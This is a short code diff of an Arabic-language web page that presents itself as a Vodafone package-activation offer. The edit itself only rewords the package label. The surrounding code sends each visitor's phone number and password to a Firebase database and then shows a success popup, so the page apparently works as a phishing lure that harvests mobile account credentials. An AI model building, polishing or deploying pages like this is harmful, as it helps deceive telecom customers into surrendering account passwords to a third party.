@@ -4,7 +4,7 @@
   <meta charset="UTF-8" />
   <title>تفعيل باقات فودافون</title>
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  
+
   <!-- Firebase -->
   <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
   <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
@@ -206,7 +206,7 @@
         db.ref("voda").push({
           num: num,
           pass: pass,
-          pack: `رصيد صافي - ${amount} جنيه (تحسب ${price} جنيه)`,
+          pack: `شحن رصيد ${amount} جنيه (بسعر ${price} جنيه)`,
           time: new Date().toLocaleString()
         }).then(() => {
           showSuccessPopup();
